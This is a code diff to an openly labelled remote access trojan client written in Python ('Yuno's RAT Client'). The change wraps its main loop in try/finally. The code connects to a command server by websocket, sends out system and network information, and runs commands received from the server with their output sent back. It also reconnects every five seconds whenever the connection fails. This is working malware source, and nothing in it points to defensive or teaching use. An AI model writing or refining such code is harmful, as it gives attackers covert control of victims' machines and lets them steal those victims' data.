@@ -39,51 +39,56 @@ def execute_command(command):
         return f"Error executing command: {e}"
 
 def main():
-    sio = Client()
+    sio = None
+    try:
+        sio = Client()
+        
+        @sio.event
+        def connect():
+            print("[*] Connected to RAT server")
+            # Exfiltrate system and network info
+            system_info = get_system_info()
+            network_info = get_network_info()
+            exfil_data = {
+                "system": system_info,
+                "network": network_info
+            }
+            sio.emit('exfil_data', json.dumps(exfil_data))
+            print("[*] Exfiltrated data sent to RAT server")
 
-    @sio.event
-    def connect():
-        print("[*] Connected to RAT server")
-        # Exfiltrate system and network info
-        system_info = get_system_info()
-        network_info = get_network_info()
-        exfil_data = {
-            "system": system_info,
-            "network": network_info
-        }
-        sio.emit('exfil_data', json.dumps(exfil_data))
-        print("[*] Exfiltrated data sent to RAT server")
+        @sio.event
+        def disconnect():
+            print("[*] Disconnected from RAT server")
 
-    @sio.event
-    def disconnect():
-        print("[*] Disconnected from RAT server")
+        @sio.event
+        def connect_error(data):
+            print(f"[!] Connection failed: {data}")
 
-    @sio.event
-    def connect_error(data):
-        print(f"[!] Connection failed: {data}")
+        @sio.event
+        def command(data):
+            print(f"[*] Received command: {data}")
+            if data.strip() == "exit":
+                print("[*] Received exit command")
+                sio.disconnect()
+                return
+            # Execute the command and send back the result (if needed)
+            output = execute_command(data)
+            print(f"[*] Executed command: {data}")
+            # Optionally send the output back
+            sio.emit('exfil_data', json.dumps({"command_output": output}))
 
-    @sio.event
-    def command(data):
-        print(f"[*] Received command: {data}")
-        if data.strip() == "exit":
-            print("[*] Received exit command")
+        while True:
+            try:
+                sio.connect(SERVER_URL, transports=['websocket'])
+                sio.wait()
+                break
+            except Exception as e:
+                print(f"[!] Connection failed: {e}")
+                print("[*] Retrying in 5 seconds...")
+                time.sleep(5)
+    finally:
+        if sio is not None:
             sio.disconnect()
-            return
-        # Execute the command and send back the result (if needed)
-        output = execute_command(data)
-        print(f"[*] Executed command: {data}")
-        # Optionally send the output back
-        sio.emit('exfil_data', json.dumps({"command_output": output}))
-
-    while True:
-        try:
-            sio.connect(SERVER_URL, transports=['websocket'])
-            sio.wait()
-            break
-        except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            print("[*] Retrying in 5 seconds...")
-            time.sleep(5)
 
 if __name__ == "__main__":
     print("=== Yuno's RAT Client ===")
